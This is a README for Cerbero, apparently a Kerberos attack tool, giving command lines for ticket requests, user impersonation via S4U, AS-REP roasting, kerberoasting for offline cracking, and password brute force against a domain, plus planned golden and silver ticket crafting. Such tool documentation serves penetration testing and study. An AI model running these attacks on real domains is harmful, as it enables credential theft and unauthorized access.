<!-- cargo-sync-readme start -->

# Cerbero
## TODOS
- asreproast: produce valid hashcat formats for aes128 and aes256
- asreproast: produce valid john formats
- kerberoast: produce valid hashcat formats for aes128 and aes256
- kerberoast: produce valid john formats
- kerberoast: include swtich to select the desired cipher

## Ask module
To request Kerberos tickets.

Ask TGT:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!!
```

Ask TGS:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --spn ldap/under.world
```

Perform S4u2self:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus
```

Perform S4u2proxy:
```shell
cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus --spn ldap/under.world
```
### TODO
- renew tickets

## AsRepRoast module
To discover users that do not require pre-authentication and retrieve a ticket to crack with hashcat or john.

Check many users:
```shell
cerbero asreproast under.world users.txt
```

Check many users with weak RC4 cipher (easier to crack):
```shell
cerbero asreproast under.world users.txt --cipher rc4
```


### TODO
- Perform LDAP query to retrieve the users with no pre-authentication required


## Brute module
To discover user credentials by performing kerberos bruteforce attack.

Test many users and passwords:
```shell
cerbero brute under.world users.txt passwords.txt
```

Test one user and many passwords:
```shell
cerbero brute under.world Zeus passwords.txt
```

Test many users and one password:
```shell
cerbero brute under.world users.txt Olympus1234
```

Test one user and one password:
```shell
cerbero brute under.world Zeus Olympus1234
```

## Convert module
To convert ticket files between krb (Windows) and ccache (Linux) format.


Convert ccache to krb:
```shell
cerbero convert hades.ccache hades.krb
```

Convert krb to ccache:
```shell
cerbero convert hades.krb hades.ccache
```

## Craft module
Module to craft tickets, and create Golden and Silver tickets.

### TODO
- craft golden tickets
- craft silver tickets

## Edit module
To edit several parts of a ticket, such as the target spn 

### TODO
- edit target spn of a ticket
- split ticket file in several file with one ticket per file
- join several ticket files in just one file

## Kerberoast module
To format encrypted part of tickets in order to be cracked by hashcat or john.

```shell
cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
```

### TODO
- Perform LDAP query to retrieve users with services


## List module
Show contents of a tickets file.


```shell
cerbero list hades.ccache
```

### TODO
- Show session keys
- Show keytab contents

## Purge module
To delete current files

TODO

<!-- cargo-sync-readme end -->
